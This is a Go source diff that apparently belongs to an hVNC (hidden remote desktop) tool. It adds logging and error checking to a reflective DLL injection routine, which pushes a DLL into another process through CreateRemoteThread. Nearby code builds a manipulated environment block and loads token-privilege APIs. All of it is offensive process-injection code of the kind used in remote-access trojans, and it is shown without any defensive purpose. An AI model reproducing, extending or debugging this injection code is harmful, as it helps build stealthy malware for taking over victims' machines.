@@ -27,6 +27,7 @@ var (
 	procWaitForSingleObject   = kernel32.NewProc("WaitForSingleObject")
 	procCloseHandle           = kernel32.NewProc("CloseHandle")
 	procResumeThread          = kernel32.NewProc("ResumeThread")
+	procGetExitCodeThread     = kernel32.NewProc("GetExitCodeThread")
 	procOpenProcessToken      = advapi32.NewProc("OpenProcessToken")
 	procLookupPrivilegeValueW = advapi32.NewProc("LookupPrivilegeValueW")
 	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
@@ -1223,7 +1224,14 @@ func buildEnvironmentBlock(searchPath, replacePath, shmName string, dllSize int)
 		extra = append(extra, fmt.Sprintf("RDI_DLL_SIZE=%d", dllSize))
 	}
 
-	return appendEnvironmentOverrides(rawSlice[:blockLen], extra)
+	block, err := appendEnvironmentOverrides(rawSlice[:blockLen], extra)
+	if err != nil {
+		return nil, err
+	}
+
+	log.Printf("hvnc inject env: nativeChars=%d finalChars=%d searchRunes=%d replaceRunes=%d hasDllSection=%v dllSize=%d",
+		blockLen, len(block), len([]rune(searchPath)), len([]rune(replacePath)), shmName != "", dllSize)
+	return block, nil
 }
 
 func appendEnvironmentOverrides(rawBlock []uint16, extra []string) ([]uint16, error) {
@@ -1345,8 +1353,21 @@ func reflectiveInject(hProcess uintptr, dllBytes []byte) error {
 		return fmt.Errorf("CreateRemoteThread failed")
 	}
 
-	procWaitForSingleObject.Call(hThread, INFINITE_WAIT)
+	waitRet, _, waitErr := procWaitForSingleObject.Call(hThread, INFINITE_WAIT)
+	var exitCode uint32
+	if ret, _, callErr := procGetExitCodeThread.Call(hThread, uintptr(unsafe.Pointer(&exitCode))); ret != 0 {
+		log.Printf("hvnc inject: remote loader thread finished wait=0x%x exit=%s", waitRet, describeExitCode(exitCode))
+	} else {
+		log.Printf("hvnc inject: GetExitCodeThread failed after wait=0x%x: %v", waitRet, callErr)
+	}
 	procCloseHandle.Call(hThread)
+
+	if waitRet == 0xFFFFFFFF {
+		return fmt.Errorf("remote loader thread wait failed: %v", waitErr)
+	}
+	if exitCode >= 0xC0000000 {
+		return fmt.Errorf("remote loader thread failed: %s", describeExitCode(exitCode))
+	}
 
 	return nil
 }
